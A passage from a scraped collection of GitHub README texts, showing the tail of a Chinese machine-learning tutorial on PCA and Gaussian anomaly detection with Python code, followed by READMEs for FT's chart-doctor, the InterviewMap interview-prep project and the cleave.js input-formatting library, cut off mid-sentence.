\n![enter description here][45]\n- \u4eba\u8138\u6570\u636e\u964d\u7ef4\n - \u539f\u59cb\u6570\u636e         \n ![enter description here][46]\n - \u53ef\u89c6\u5316\u90e8\u5206`U`\u77e9\u9635\u4fe1\u606f    \n ![enter description here][47]\n - \u6062\u590d\u6570\u636e    \n ![enter description here][48]\n\n### 9\u3001[\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684PCA\u5b9e\u73b0\u964d\u7ef4](\/PCA\/PCA.py_scikit-learn.py)\n- \u5bfc\u5165\u9700\u8981\u7684\u5305\uff1a\n```\n#-*- coding: utf-8 -*-\n# Author:bob\n# Date:2016.12.22\nimport numpy as np\nfrom matplotlib import pyplot as plt\nfrom scipy import io as spio\nfrom sklearn.decomposition import pca\nfrom sklearn.preprocessing import StandardScaler\n```\n- \u5f52\u4e00\u5316\u6570\u636e\n```\n    '''\u5f52\u4e00\u5316\u6570\u636e\u5e76\u4f5c\u56fe'''\n    scaler = StandardScaler()\n    scaler.fit(X)\n    x_train = scaler.transform(X)\n```\n- \u4f7f\u7528PCA\u6a21\u578b\u62df\u5408\u6570\u636e\uff0c\u5e76\u964d\u7ef4\n - `n_components`\u5bf9\u5e94\u8981\u5c06\u7684\u7ef4\u5ea6\n```\n    '''\u62df\u5408\u6570\u636e'''\n    K=1 # \u8981\u964d\u7684\u7ef4\u5ea6\n    model = pca.PCA(n_components=K).fit(x_train)   # \u62df\u5408\u6570\u636e\uff0cn_components\u5b9a\u4e49\u8981\u964d\u7684\u7ef4\u5ea6\n    Z = model.transform(x_train)    # transform\u5c31\u4f1a\u6267\u884c\u964d\u7ef4\u64cd\u4f5c\n```\n\n- \u6570\u636e\u6062\u590d\n - `model.components_`\u4f1a\u5f97\u5230\u964d\u7ef4\u4f7f\u7528\u7684`U`\u77e9\u9635 \n```\n    '''\u6570\u636e\u6062\u590d\u5e76\u4f5c\u56fe'''\n    Ureduce = model.components_     # \u5f97\u5230\u964d\u7ef4\u7528\u7684Ureduce\n    x_rec = np.dot(Z,Ureduce)       # \u6570\u636e\u6062\u590d\n```\n\n\n\n---------------------------------------------------------------\n\n\n## \u4e03\u3001\u5f02\u5e38\u68c0\u6d4b Anomaly Detection\n- [\u5168\u90e8\u4ee3\u7801](\/AnomalyDetection\/AnomalyDetection.py)\n\n### 1\u3001\u9ad8\u65af\u5206\u5e03\uff08\u6b63\u6001\u5206\u5e03\uff09`Gaussian distribution` \n- \u5206\u5e03\u51fd\u6570\uff1a![$$p(x) = {1 \\over {\\sqrt {2\\pi } \\sigma }}{e^{ - {{{{(x - u)}^2}} \\over {2{\\sigma ^2}}}}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24p%28x%29%20%3D%20%7B1%20%5Cover%20%7B%5Csqrt%20%7B2%5Cpi%20%7D%20%5Csigma%20%7D%7D%7Be%5E%7B%20-%20%7B%7B%7B%7B%28x%20-%20u%29%7D%5E2%7D%7D%20%5Cover%20%7B2%7B%5Csigma%20%5E2%7D%7D%7D%7D%7D%24%24)\n - \u5176\u4e2d\uff0c`u`\u4e3a\u6570\u636e\u7684**\u5747\u503c**\uff0c`\u03c3`\u4e3a\u6570\u636e\u7684**\u6807\u51c6\u5dee**\n - `\u03c3`\u8d8a**\u5c0f**\uff0c\u5bf9\u5e94\u7684\u56fe\u50cf\u8d8a**\u5c16**\n- \u53c2\u6570\u4f30\u8ba1\uff08`parameter estimation`\uff09\n - ![$$u = {1 \\over m}\\sum\\limits_{i = 1}^m {{x^{(i)}}} $$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24u%20%3D%20%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7Bx%5E%7B%28i%29%7D%7D%7D%20%24%24)\n - ![$${\\sigma ^2} = {1 \\over m}\\sum\\limits_{i = 1}^m {{{({x^{(i)}} - u)}^2}} $$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%7B%5Csigma%20%5E2%7D%20%3D%20%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7B%7B%28%7Bx%5E%7B%28i%29%7D%7D%20-%20u%29%7D%5E2%7D%7D%20%24%24)\n\n### 2\u3001\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5\n- \u4f8b\u5b50\n - \u8bad\u7ec3\u96c6\uff1a![$$\\{ {x^{(1)}},{x^{(2)}}, \\cdots {x^{(m)}}\\} $$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%5C%7B%20%7Bx%5E%7B%281%29%7D%7D%2C%7Bx%5E%7B%282%29%7D%7D%2C%20%5Ccdots%20%7Bx%5E%7B%28m%29%7D%7D%5C%7D%20%24%24),\u5176\u4e2d![$$x \\in {R^n}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24x%20%5Cin%20%7BR%5En%7D%24%24)\n - \u5047\u8bbe![$${x_1},{x_2} \\cdots {x_n}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%7Bx_1%7D%2C%7Bx_2%7D%20%5Ccdots%20%7Bx_n%7D%24%24)\u76f8\u4e92\u72ec\u7acb\uff0c\u5efa\u7acbmodel\u6a21\u578b\uff1a![$$p(x) = p({x_1};{u_1},\\sigma _1^2)p({x_2};{u_2},\\sigma _2^2) \\cdots p({x_n};{u_n},\\sigma _n^2) = \\prod\\limits_{j = 1}^n {p({x_j};{u_j},\\sigma _j^2)} $$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24p%28x%29%20%3D%20p%28%7Bx_1%7D%3B%7Bu_1%7D%2C%5Csigma%20_1%5E2%29p%28%7Bx_2%7D%3B%7Bu_2%7D%2C%5Csigma%20_2%5E2%29%20%5Ccdots%20p%28%7Bx_n%7D%3B%7Bu_n%7D%2C%5Csigma%20_n%5E2%29%20%3D%20%5Cprod%5Climits_%7Bj%20%3D%201%7D%5En%20%7Bp%28%7Bx_j%7D%3B%7Bu_j%7D%2C%5Csigma%20_j%5E2%29%7D%20%24%24)\n- \u8fc7\u7a0b\n - \u9009\u62e9\u5177\u6709\u4ee3\u8868\u5f02\u5e38\u7684`feature`:xi\n - \u53c2\u6570\u4f30\u8ba1\uff1a![$${u_1},{u_2}, \\cdots ,{u_n};\\sigma _1^2,\\sigma _2^2 \\cdots ,\\sigma _n^2$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%7Bu_1%7D%2C%7Bu_2%7D%2C%20%5Ccdots%20%2C%7Bu_n%7D%3B%5Csigma%20_1%5E2%2C%5Csigma%20_2%5E2%20%5Ccdots%20%2C%5Csigma%20_n%5E2%24%24)\n - \u8ba1\u7b97`p(x)`,\u82e5\u662f`P(x)<\u03b5`\u5219\u8ba4\u4e3a\u5f02\u5e38\uff0c\u5176\u4e2d`\u03b5`\u4e3a\u6211\u4eec\u8981\u6c42\u7684\u6982\u7387\u7684\u4e34\u754c\u503c`threshold`\n- \u8fd9\u91cc\u53ea\u662f**\u5355\u5143\u9ad8\u65af\u5206\u5e03**\uff0c\u5047\u8bbe\u4e86`feature`\u4e4b\u95f4\u662f\u72ec\u7acb\u7684\uff0c\u4e0b\u9762\u4f1a\u8bb2\u5230**\u591a\u5143\u9ad8\u65af\u5206\u5e03**\uff0c\u4f1a\u81ea\u52a8\u6355\u6349\u5230`feature`\u4e4b\u95f4\u7684\u5173\u7cfb\n- **\u53c2\u6570\u4f30\u8ba1**\u5b9e\u73b0\u4ee3\u7801\n```\n# \u53c2\u6570\u4f30\u8ba1\u51fd\u6570\uff08\u5c31\u662f\u6c42\u5747\u503c\u548c\u65b9\u5dee\uff09\ndef estimateGaussian(X):\n    m,n = X.shape\n    mu = np.zeros((n,1))\n    sigma2 = np.zeros((n,1))\n    \n    mu = np.mean(X, axis=0) # axis=0\u8868\u793a\u5217\uff0c\u6bcf\u5217\u7684\u5747\u503c\n    sigma2 = np.var(X,axis=0) # \u6c42\u6bcf\u5217\u7684\u65b9\u5dee\n    return mu,sigma2\n```\n\n### 3\u3001\u8bc4\u4ef7`p(x)`\u7684\u597d\u574f\uff0c\u4ee5\u53ca`\u03b5`\u7684\u9009\u53d6\n- \u5bf9**\u504f\u659c\u6570\u636e**\u7684\u9519\u8bef\u5ea6\u91cf\n - \u56e0\u4e3a\u6570\u636e\u53ef\u80fd\u662f\u975e\u5e38**\u504f\u659c**\u7684\uff08\u5c31\u662f`y=1`\u7684\u4e2a\u6570\u975e\u5e38\u5c11\uff0c(`y=1`\u8868\u793a\u5f02\u5e38)\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528`Precision\/Recall`\uff0c\u8ba1\u7b97`F1Score`(\u5728**CV\u4ea4\u53c9\u9a8c\u8bc1\u96c6**\u4e0a)\n - \u4f8b\u5982\uff1a\u9884\u6d4b\u764c\u75c7\uff0c\u5047\u8bbe\u6a21\u578b\u53ef\u4ee5\u5f97\u5230`99%`\u80fd\u591f\u9884\u6d4b\u6b63\u786e\uff0c`1%`\u7684\u9519\u8bef\u7387\uff0c\u4f46\u662f\u5b9e\u9645\u764c\u75c7\u7684\u6982\u7387\u5f88\u5c0f\uff0c\u53ea\u6709`0.5%`\uff0c\u90a3\u4e48\u6211\u4eec\u59cb\u7ec8\u9884\u6d4b\u6ca1\u6709\u764c\u75c7y=0\u53cd\u800c\u53ef\u4ee5\u5f97\u5230\u66f4\u5c0f\u7684\u9519\u8bef\u7387\u3002\u4f7f\u7528`error rate`\u6765\u8bc4\u4f30\u5c31\u4e0d\u79d1\u5b66\u4e86\u3002\n - \u5982\u4e0b\u56fe\u8bb0\u5f55\uff1a    \n ![enter description here][49]\n - ![$$\\Pr ecision = {{TP} \\over {TP + FP}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%5CPr%20ecision%20%3D%20%7B%7BTP%7D%20%5Cover%20%7BTP%20&plus;%20FP%7D%7D%24%24) \uff0c\u5373\uff1a**\u6b63\u786e\u9884\u6d4b\u6b63\u6837\u672c\/\u6240\u6709\u9884\u6d4b\u6b63\u6837\u672c**\n - ![$${\\mathop{\\rm Re}\\nolimits} {\\rm{call}} = {{TP} \\over {TP + FN}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%7B%5Cmathop%7B%5Crm%20Re%7D%5Cnolimits%7D%20%7B%5Crm%7Bcall%7D%7D%20%3D%20%7B%7BTP%7D%20%5Cover%20%7BTP%20&plus;%20FN%7D%7D%24%24) \uff0c\u5373\uff1a**\u6b63\u786e\u9884\u6d4b\u6b63\u6837\u672c\/\u771f\u5b9e\u503c\u4e3a\u6b63\u6837\u672c**\n - \u603b\u662f\u8ba9`y=1`(\u8f83\u5c11\u7684\u7c7b)\uff0c\u8ba1\u7b97`Precision`\u548c`Recall`\n - ![$${F_1}Score = 2{{PR} \\over {P + R}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%7BF_1%7DScore%20%3D%202%7B%7BPR%7D%20%5Cover%20%7BP%20&plus;%20R%7D%7D%24%24)\n - \u8fd8\u662f\u4ee5\u764c\u75c7\u9884\u6d4b\u4e3a\u4f8b\uff0c\u5047\u8bbe\u9884\u6d4b\u90fd\u662fno-cancer\uff0cTN=199\uff0cFN=1\uff0cTP=0\uff0cFP=0\uff0c\u6240\u4ee5\uff1aPrecision=0\/0\uff0cRecall=0\/1=0\uff0c\u5c3d\u7ba1accuracy=199\/200=99.5%\uff0c\u4f46\u662f\u4e0d\u53ef\u4fe1\u3002\n\n- `\u03b5`\u7684\u9009\u53d6\n - \u5c1d\u8bd5\u591a\u4e2a`\u03b5`\u503c\uff0c\u4f7f`F1Score`\u7684\u503c\u9ad8\n- \u5b9e\u73b0\u4ee3\u7801\n```\n# \u9009\u62e9\u6700\u4f18\u7684epsilon\uff0c\u5373\uff1a\u4f7fF1Score\u6700\u5927    \ndef selectThreshold(yval,pval):\n    '''\u521d\u59cb\u5316\u6240\u9700\u53d8\u91cf'''\n    bestEpsilon = 0.\n    bestF1 = 0.\n    F1 = 0.\n    step = (np.max(pval)-np.min(pval))\/1000\n    '''\u8ba1\u7b97'''\n    for epsilon in np.arange(np.min(pval),np.max(pval),step):\n        cvPrecision = pval<epsilon\n        tp = np.sum((cvPrecision == 1) & (yval == 1).ravel()).astype(float)  # sum\u6c42\u548c\u662fint\u578b\u7684\uff0c\u9700\u8981\u8f6c\u4e3afloat\n        fp = np.sum((cvPrecision == 1) & (yval == 0).ravel()).astype(float)\n        fn = np.sum((cvPrecision == 0) & (yval == 1).ravel()).astype(float)\n        precision = tp\/(tp+fp)  # \u7cbe\u51c6\u5ea6\n        recision = tp\/(tp+fn)   # \u53ec\u56de\u7387\n        F1 = (2*precision*recision)\/(precision+recision)  # F1Score\u8ba1\u7b97\u516c\u5f0f\n        if F1 > bestF1:  # \u4fee\u6539\u6700\u4f18\u7684F1 Score\n            bestF1 = F1\n            bestEpsilon = epsilon\n    return bestEpsilon,bestF1\n```\n\n### 4\u3001\u9009\u62e9\u4f7f\u7528\u4ec0\u4e48\u6837\u7684feature\uff08\u5355\u5143\u9ad8\u65af\u5206\u5e03\uff09\n- \u5982\u679c\u4e00\u4e9b\u6570\u636e\u4e0d\u662f\u6ee1\u8db3\u9ad8\u65af\u5206\u5e03\u7684\uff0c\u53ef\u4ee5\u53d8\u5316\u4e00\u4e0b\u6570\u636e\uff0c\u4f8b\u5982`log(x+C),x^(1\/2)`\u7b49\n- \u5982\u679c`p(x)`\u7684\u503c\u65e0\u8bba\u5f02\u5e38\u4e0e\u5426\u90fd\u5f88\u5927\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7ec4\u5408\u591a\u4e2a`feature`,(\u56e0\u4e3afeature\u4e4b\u95f4\u53ef\u80fd\u662f\u6709\u5173\u7cfb\u7684)\n\n### 5\u3001\u591a\u5143\u9ad8\u65af\u5206\u5e03\n- \u5355\u5143\u9ad8\u65af\u5206\u5e03\u5b58\u5728\u7684\u95ee\u9898\n - \u5982\u4e0b\u56fe\uff0c\u7ea2\u8272\u7684\u70b9\u4e3a\u5f02\u5e38\u70b9\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u6b63\u5e38\u70b9\uff08\u6bd4\u5982CPU\u548cmemory\u7684\u53d8\u5316\uff09   \n ![enter description here][50]\n - x1\u5bf9\u5e94\u7684\u9ad8\u65af\u5206\u5e03\u5982\u4e0b\uff1a   \n ![enter description here][51]\n - x2\u5bf9\u5e94\u7684\u9ad8\u65af\u5206\u5e03\u5982\u4e0b\uff1a   \n ![enter description here][52]\n - \u53ef\u4ee5\u770b\u51fa\u5bf9\u5e94\u7684p(x1)\u548cp(x2)\u7684\u503c\u53d8\u5316\u5e76\u4e0d\u5927\uff0c\u5c31\u4e0d\u4f1a\u8ba4\u4e3a\u5f02\u5e38\n - \u56e0\u4e3a\u6211\u4eec\u8ba4\u4e3afeature\u4e4b\u95f4\u662f\u76f8\u4e92\u72ec\u7acb\u7684\uff0c\u6240\u4ee5\u5982\u4e0a\u56fe\u662f\u4ee5**\u6b63\u5706**\u7684\u65b9\u5f0f\u6269\u5c55\n- \u591a\u5143\u9ad8\u65af\u5206\u5e03\n - ![$$x \\in {R^n}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24x%20%5Cin%20%7BR%5En%7D%24%24)\uff0c\u5e76\u4e0d\u662f\u5efa\u7acb`p(x1),p(x2)...p(xn)`\uff0c\u800c\u662f\u7edf\u4e00\u5efa\u7acb`p(x)`\n - \u5176\u4e2d\u53c2\u6570\uff1a![$$\\mu  \\in {R^n},\\Sigma  \\in {R^{n \\times {\\rm{n}}}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%5Cmu%20%5Cin%20%7BR%5En%7D%2C%5CSigma%20%5Cin%20%7BR%5E%7Bn%20%5Ctimes%20%7B%5Crm%7Bn%7D%7D%7D%7D%24%24),`\u03a3`\u4e3a**\u534f\u65b9\u5dee\u77e9\u9635**\n - ![$$p(x) = {1 \\over {{{(2\\pi )}^{{n \\over 2}}}|\\Sigma {|^{{1 \\over 2}}}}}{e^{ - {1 \\over 2}{{(x - u)}^T}{\\Sigma ^{ - 1}}(x - u)}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24p%28x%29%20%3D%20%7B1%20%5Cover%20%7B%7B%7B%282%5Cpi%20%29%7D%5E%7B%7Bn%20%5Cover%202%7D%7D%7D%7C%5CSigma%20%7B%7C%5E%7B%7B1%20%5Cover%202%7D%7D%7D%7D%7D%7Be%5E%7B%20-%20%7B1%20%5Cover%202%7D%7B%7B%28x%20-%20u%29%7D%5ET%7D%7B%5CSigma%20%5E%7B%20-%201%7D%7D%28x%20-%20u%29%7D%7D%24%24)\n - \u540c\u6837\uff0c`|\u03a3|`\u8d8a\u5c0f\uff0c`p(x)`\u8d8a\u5c16\n - \u4f8b\u5982\uff1a    \n ![enter description here][53]\uff0c  \n \u8868\u793ax1,x2**\u6b63\u76f8\u5173**\uff0c\u5373x1\u8d8a\u5927\uff0cx2\u4e5f\u5c31\u8d8a\u5927\uff0c\u5982\u4e0b\u56fe\uff0c\u4e5f\u5c31\u53ef\u4ee5\u5c06\u7ea2\u8272\u7684\u5f02\u5e38\u70b9\u68c0\u67e5\u51fa\u4e86\n ![enter description here][54]      \n \u82e5\uff1a   \n  ![enter description here][55]\uff0c   \n \u8868\u793ax1,x2**\u8d1f\u76f8\u5173**\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u591a\u5143\u9ad8\u65af\u5206\u5e03\u51fd\u6570    \ndef multivariateGaussian(X,mu,Sigma2):\n    k = len(mu)\n    if (Sigma2.shape[0]>1):\n        Sigma2 = np.diag(Sigma2)\n    '''\u591a\u5143\u9ad8\u65af\u5206\u5e03\u51fd\u6570'''    \n    X = X-mu\n    argu = (2*np.pi)**(-k\/2)*np.linalg.det(Sigma2)**(-0.5)\n    p = argu*np.exp(-0.5*np.sum(np.dot(X,np.linalg.inv(Sigma2))*X,axis=1))  # axis\u8868\u793a\u6bcf\u884c\n    return p\n```\n### 6\u3001\u5355\u5143\u548c\u591a\u5143\u9ad8\u65af\u5206\u5e03\u7279\u70b9\n- \u5355\u5143\u9ad8\u65af\u5206\u5e03\n - \u4eba\u4e3a\u53ef\u4ee5\u6355\u6349\u5230`feature`\u4e4b\u95f4\u7684\u5173\u7cfb\u65f6\u53ef\u4ee5\u4f7f\u7528\n - \u8ba1\u7b97\u91cf\u5c0f\n- \u591a\u5143\u9ad8\u65af\u5206\u5e03\n - \u81ea\u52a8\u6355\u6349\u5230\u76f8\u5173\u7684feature\n - \u8ba1\u7b97\u91cf\u5927\uff0c\u56e0\u4e3a\uff1a![$$\\Sigma  \\in {R^{n \\times {\\rm{n}}}}$$](http:\/\/latex.codecogs.com\/png.latex?%5Cfn_cm%20%24%24%5CSigma%20%5Cin%20%7BR%5E%7Bn%20%5Ctimes%20%7B%5Crm%7Bn%7D%7D%7D%7D%24%24)\n - `m>n`\u6216`\u03a3`\u53ef\u9006\u65f6\u53ef\u4ee5\u4f7f\u7528\u3002\uff08\u82e5\u4e0d\u53ef\u9006\uff0c\u53ef\u80fd\u6709\u5197\u4f59\u7684x\uff0c\u56e0\u4e3a\u7ebf\u6027\u76f8\u5173\uff0c\u4e0d\u53ef\u9006\uff0c\u6216\u8005\u5c31\u662fm<n\uff09\n\n### 7\u3001\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c\n- \u663e\u793a\u6570\u636e     \n![enter description here][56]\n- \u7b49\u9ad8\u7ebf      \n![enter description here][57]\n- \u5f02\u5e38\u70b9\u6807\u6ce8   \n![enter description here][58]\n\n\n\n----------------------------------\n\n\n  [1]: .\/images\/LinearRegression_01.png \"LinearRegression_01.png\"\n  [2]: .\/images\/LogisticRegression_01.png \"LogisticRegression_01.png\"\n  [3]: .\/images\/LogisticRegression_02.png \"LogisticRegression_02.png\"\n  [4]: .\/images\/LogisticRegression_03.jpg \"LogisticRegression_03.jpg\"\n  [5]: .\/images\/LogisticRegression_04.png \"LogisticRegression_04.png\"\n  [6]: .\/images\/LogisticRegression_05.png \"LogisticRegression_05.png\"\n  [7]: .\/images\/LogisticRegression_06.png \"LogisticRegression_06.png\"\n  [8]: .\/images\/LogisticRegression_07.png \"LogisticRegression_07.png\"\n  [9]: .\/images\/LogisticRegression_08.png \"LogisticRegression_08.png\"\n  [10]: .\/images\/LogisticRegression_09.png \"LogisticRegression_09.png\"\n  [11]: .\/images\/LogisticRegression_11.png \"LogisticRegression_11.png\"\n  [12]: .\/images\/LogisticRegression_10.png \"LogisticRegression_10.png\"\n  [13]: .\/images\/LogisticRegression_12.png \"LogisticRegression_12.png\"\n  [14]: .\/images\/LogisticRegression_13.png \"LogisticRegression_13.png\"\n  [15]: .\/images\/NeuralNetwork_01.png \"NeuralNetwork_01.png\"\n  [16]: .\/images\/NeuralNetwork_02.png \"NeuralNetwork_02.png\"\n  [17]: .\/images\/NeuralNetwork_03.jpg \"NeuralNetwork_03.jpg\"\n  [18]: .\/images\/NeuralNetwork_04.png \"NeuralNetwork_04.png\"\n  [19]: .\/images\/NeuralNetwork_05.png \"NeuralNetwork_05.png\"\n  [20]: .\/images\/NeuralNetwork_06.png \"NeuralNetwork_06.png\"\n  [21]: .\/images\/NeuralNetwork_07.png \"NeuralNetwork_07.png\"\n  [22]: .\/images\/NeuralNetwork_08.png \"NeuralNetwork_08.png\"\n  [23]: .\/images\/NeuralNetwork_09.png \"NeuralNetwork_09.png\"\n  [24]: .\/images\/SVM_01.png \"SVM_01.png\"\n  [25]: .\/images\/SVM_02.png \"SVM_02.png\"\n  [26]: .\/images\/SVM_03.png \"SVM_03.png\"\n  [27]: .\/images\/SVM_04.png \"SVM_04.png\"\n  [28]: .\/images\/SVM_05.png \"SVM_05.png\"\n  [29]: .\/images\/SVM_06.png \"SVM_06.png\"\n  [30]: .\/images\/SVM_07.png \"SVM_07.png\"\n  [31]: .\/images\/SVM_08.png \"SVM_08.png\"\n  [32]: .\/images\/SVM_09.png \"SVM_09.png\"\n  [33]: .\/images\/SVM_10.png \"SVM_10.png\"\n  [34]: .\/images\/K-Means_01.png \"K-Means_01.png\"\n  [35]: .\/images\/K-Means_02.png \"K-Means_02.png\"\n  [36]: .\/images\/K-Means_03.png \"K-Means_03.png\"\n  [37]: .\/images\/K-Means_07.png \"K-Means_07.png\"\n  [38]: .\/images\/K-Means_04.png \"K-Means_04.png\"\n  [39]: .\/images\/K-Means_05.png \"K-Means_05.png\"\n  [40]: .\/images\/K-Means_06.png \"K-Means_06.png\"\n  [41]: .\/images\/PCA_01.png \"PCA_01.png\"\n  [42]: .\/images\/PCA_02.png \"PCA_02.png\"\n  [43]: .\/images\/PCA_03.png \"PCA_03.png\"\n  [44]: .\/images\/PCA_04.png \"PCA_04.png\"\n  [45]: .\/images\/PCA_05.png \"PCA_05.png\"\n  [46]: .\/images\/PCA_06.png \"PCA_06.png\"\n  [47]: .\/images\/PCA_07.png \"PCA_07.png\"\n  [48]: .\/images\/PCA_08.png \"PCA_08.png\"\n  [49]: .\/images\/AnomalyDetection_01.png \"AnomalyDetection_01.png\"\n  [50]: .\/images\/AnomalyDetection_04.png \"AnomalyDetection_04.png\"\n  [51]: .\/images\/AnomalyDetection_02.png \"AnomalyDetection_02.png\"\n  [52]: .\/images\/AnomalyDetection_03.png \"AnomalyDetection_03.png\"\n  [53]: .\/images\/AnomalyDetection_05.png \"AnomalyDetection_05.png\"\n  [54]: .\/images\/AnomalyDetection_07.png \"AnomalyDetection_07.png\"\n  [55]: .\/images\/AnomalyDetection_06.png \"AnomalyDetection_06.png\"\n  [56]: .\/images\/AnomalyDetection_08.png \"AnomalyDetection_08.png\"\n  [57]: .\/images\/AnomalyDetection_09.png \"AnomalyDetection_09.png\"\n  [58]: .\/images\/AnomalyDetection_10.png \"AnomalyDetection_10.png\"\n"},{"repo":"\/ft-interactive\/chart-doctor","language":"HTML","readme_contents":"# chart-doctor\nSample files to accompany the FT's [Chart Doctor](http:\/\/www.ft.com\/chart-doctor) feature.\n\n## Licence\nThis software is published by the Financial Times under the [MIT licence](http:\/\/opensource.org\/licenses\/MIT). \n\nPlease note the MIT licence includes only the software, and does not cover any FT content made available using the software, which is copyright &copy; The Financial Times Limited, all rights reserved. For more information about re-publishing FT content, please contact our [syndication department](http:\/\/syndication.ft.com\/).\n"},{"repo":"\/InterviewMap\/CS-Interview-Knowledge-Map","language":null,"readme_contents":"<img align=\"center\" src='.\/InterviewMap.png' \/>\n\n<h1 align=\"center\">\n  Interview Map\n<\/h1>\n\n<h4 align=\"center\">This is a map that can help you prepare better for the next interview<\/h4>\n\n<p align=\"center\">\n  <a href=\"https:\/\/gitter.im\/interview-map\/Lobby?utm_source=share-link&utm_medium=link&utm_campaign=share-link\"><img src=\"https:\/\/img.shields.io\/gitter\/room\/nwjs\/nw.js.svg\" alt=\"Gitter\"><\/a>\n  <a href=\"https:\/\/t.me\/joinchat\/GULTjw9enq3J4NQ6Yh5Ntw\"><img src=\"https:\/\/img.shields.io\/badge\/chat-Telegram-brightgreen.svg\" alt=\"Telegram\"><\/a>\n<\/p>\n\n## Foreword\n\n> When you are old, looking back on your life, you will find out: when to study abroad, when to decide on your first occupation, when to choose the other half to fall in love with, when to marry; all of these are great changes in fate. We were just standing at the three-forked intersection and seeing the wind blow the clouds and sails. The day you made your choice was a quite dull and peaceful day in the diary, and it was thought to be an ordinary day in your life.\n> A project to change the interview \u2014 Interview Map.\n\n\nThe best job-hopping months, September and October, are coming\uff08in Chinese, there is an idiom called \"Golden September and Silver October\u201d). Most people will be eager to prepare for and to pursue better job opportunities. The interview will be their biggest challenge.\n\nFor the interview, the usual accumulation of learning is necessary, but the preparation before the interview is also crucial.\n\nA few months ago, I set up a small team. It took us half a year to search for interview questions from big companies, filtering out nearly 100 knowledge points, writing the content and translating it all into English. Today, we finally release the first version and the total number of words has reached more than 100,000 so far.\n\nWe think that rote learning of the interview questions is not very useful. Only when you are familiar with the various knowledge points and are capable of integrating them, can you get through the interviews. This InterviewMap currently contains nearly a hundred high-frequency knowledge points. No matter the preparation before the interview or the study, we believe that it will help you. The current content includes JS, network, browser related, performance optimization, security, framework, Git, data structures, algorithms, etc. Whether it is basic or advanced learning or source code interpretation, you can get a satisfactory answer in this InterviewMap, and we hope that the InterviewMap can help you better prepare for your interview.\n\nThe contents of the repository will update continuously, and more content will be added into the repository later, such as system design, the blockchain, operating and support, backend, etc. Of course, these are not my strengths, and I will invite friends who have good experience in this area to write this content.\n\n\n# Outline\n![mind](https:\/\/yck-1254263422.cos.ap-shanghai.myqcloud.com\/blog\/2019-06-01-043136.png)\n\n\n## Contributing\nIf you find something wrong with the knowledge point or there\u2019s a bug in the code, you are welcome to submit an English [issue](https:\/\/github.com\/InterviewMap\/CS-Interview-Knowledge-Map\/issues\/new). If your English is not good, please discuss it in  [this issue](https:\/\/github.com\/InterviewMap\/CS-Interview-Knowledge-Map\/issues\/18).\n\nIf you think you know of a good knowledge point to contribute, or would like to participate in translation and proofreading, you are welcome to submit a [PR](https:\/\/github.com\/InterviewMap\/CS-Interview-Knowledge-Map\/pulls), or you can contact me at <zx597813039@gmail.com>.\n\n## Todo\n\n* Complete the content about CSS\n* Complete the content about Webpack\n* Complete the content about the mini program (WeiXin)\n* Improve the content of the framework\n\nThe above content is expected to be updated completely in September, and you are welcome to participate in the construction of this interviewmap.\n\n## Reading\n\n[Online version is clearer to read](https:\/\/yuchengkai.cn\/docs\/).\n\n## Communicate and share\nIf you want to communicate and discuss the content of this interviewmap with others, you can join [communicate group](https:\/\/github.com\/InterviewMap\/CS-Interview-Knowledge-Map\/issues\/19) or [gitter](https:\/\/gitter.im\/interview-map\/Lobby?utm_source=share-link&utm_medium=link&utm_campaign=share-link).\n\n\n## Support us\nIf the interviewmap helps you with your interview or study, you can [support our work](https:\/\/github.com\/InterviewMap\/CS-Interview-Knowledge-Map\/issues\/20).\n\n\n## License\n[MIT](LICENSE). Copyright (c)\n"},{"repo":"\/nosir\/cleave.js","language":"JavaScript","readme_contents":"# Cleave.js\n\n[![Travis](https:\/\/img.shields.io\/travis\/nosir\/cleave.js.svg?maxAge=2592000)](https:\/\/travis-ci.org\/nosir\/cleave.js)\n[![Codacy Badge](https:\/\/api.codacy.com\/project\/badge\/Grade\/b1c0b0da42fa418f887076a3f7352aea)](https:\/\/www.codacy.com\/app\/nosir\/cleave-js?utm_source=github.com&utm_medium=referral&utm_content=nosir\/cleave.js&utm_campaign=badger)\n[![npm version](https:\/\/badge.fury.io\/js\/cleave.js.svg)](https:\/\/badge.fury.io\/js\/cleave.js)\n[![npm downloads](https:\/\/img.shields.io\/npm\/dm\/cleave.js.svg)](https:\/\/www.npmjs.com\/package\/cleave.js)\n[![Documents](https:\/\/img.shields.io\/badge\/documents-check-3362c2.svg)](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/doc.md)\n\nCleave.js has a simple purpose: to help you format input text content automatically.\n\n## Features\n\n- Credit card number formatting\n- Phone number formatting (i18n js lib separated for each country to reduce size)\n- Date formatting\n- Numeral formatting\n- Custom delimiter, prefix and blocks pattern\n- CommonJS \/ AMD mode\n- ReactJS component\n- AngularJS directive (1.x)\n- ES Module\n\n**TL;DR** [the demo page](http:\/\/nosir.github.io\/cleave.js\/)\n\n## Why?\n\nThe idea is to provide an easy way to increase input field readability by formatting your typed data. By using this library, you won't need to write any mind-blowing regular expressions or mask patterns to format input text.\n\nHowever, this isn't meant to replace any validation or mask library, you should still sanitize and validate your data in 